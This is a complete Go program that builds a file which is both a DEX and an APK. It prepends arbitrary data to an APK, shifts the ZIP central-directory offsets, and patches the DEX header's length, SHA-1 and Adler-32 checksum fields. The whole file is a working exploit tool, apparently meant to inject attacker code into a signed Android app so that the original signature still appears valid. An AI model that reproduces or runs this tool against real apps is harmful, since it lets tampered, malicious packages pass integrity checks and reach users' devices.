package main

import (
    "fmt"
    "flag"
    "encoding/hex"
    "os"
    "io/ioutil"
    "bytes"
    "encoding/binary"
    "crypto/sha1"
    "hash/adler32"
)

var fixChecksum bool

func commandUsage() {
    fmt.Printf("Usage: %s [-c] input_data input_apk output_apk\n", os.Args[0])
    flag.PrintDefaults()
}

func checkError(e error) {
    if e != nil {
        fmt.Println(e)
        os.Exit(1)
    }
}

func fromHex(s string) []byte {
    b, err := hex.DecodeString(s)
    checkError(err)
    return b
}

func updateChecksum(b []byte) []byte {
    d := sha1.Sum(b[32:])
    b = writeArray(b, 12, d[:])
    b = writeArray(b, 8, bytesLitEnd(adler32.Checksum(b[12:])))
    return b
}

func updateDexLength(b []byte, length int) []byte {
    return writeArray(b, 32, bytesLitEnd(uint32(length)))
}

func writeArray(b []byte, offset int, d []byte) []byte {
    for i := 0; i < len(d); i++ {
        b[offset + i] = d[i]
    }
    return b
}

func bytesLitEnd(input uint32) []byte {
    b := make([]byte, 4)
    binary.LittleEndian.PutUint32(b, input)
    return b
}

func uint32LitEnd(input []byte) uint32 {
    return binary.LittleEndian.Uint32(input)
}

func main() {
    flag.Usage = commandUsage
    flag.BoolVar(&fixChecksum, "-dex", false, "Use this flag to correct the input DEX's checksums.")
    flag.BoolVar(&fixChecksum, "c", false, "Use this flag to correct the input DEX's checksums.")

    // Parse arguments
    flag.Parse()

    // Check necessary arguments
    if flag.NArg() != 3 {
        flag.Usage()
        os.Exit(1)
    }

    // Load arguments
    inputDataPath := flag.Args()[0]
    inputApkPath  := flag.Args()[1]
    outputApkPath := flag.Args()[2]

    // Load bytes from hex
    cdEndSignature := fromHex("504b0506")
    cdStartSignature := fromHex("504b0102")

    // Read input data
    inputData, err := ioutil.ReadFile(inputDataPath)
    checkError(err)

    // Read input apk
    inputApk, err := ioutil.ReadFile(inputApkPath)
    checkError(err)

    // Find Central Directory end address
    cdEndAddr := bytes.LastIndex(inputApk, cdEndSignature)

    // Find Central Directory start address
    cdStartAddr := int(uint32LitEnd(inputApk[cdEndAddr+16:cdEndAddr+20]))

    // Offset address
    inputApk = writeArray(inputApk, cdEndAddr + 16, bytesLitEnd(uint32(cdStartAddr + len(inputData))))

    // Offset all remaining addresses
    pos := cdStartAddr
    for pos < cdEndAddr {
        offset := uint32LitEnd(inputApk[pos+42:pos+46])

        inputApk = writeArray(inputApk, pos + 42, bytesLitEnd(offset + uint32(len(inputData))))

        tempPos := bytes.Index(inputApk[pos+46:cdEndAddr], cdStartSignature)
        if tempPos == -1 {
            break
        }

        pos += tempPos + 46;
    }

    out := append(inputData, inputApk...)

    if fixChecksum {
        out = updateDexLength(out, len(out))
        out = updateChecksum(out)
    }

    f, err := os.Create(outputApkPath)
    checkError(err)
    _, err = f.Write(out)
    checkError(err)
    err = f.Close()
    checkError(err)

    fmt.Printf("Successfully generated %s.\n", outputApkPath)
}
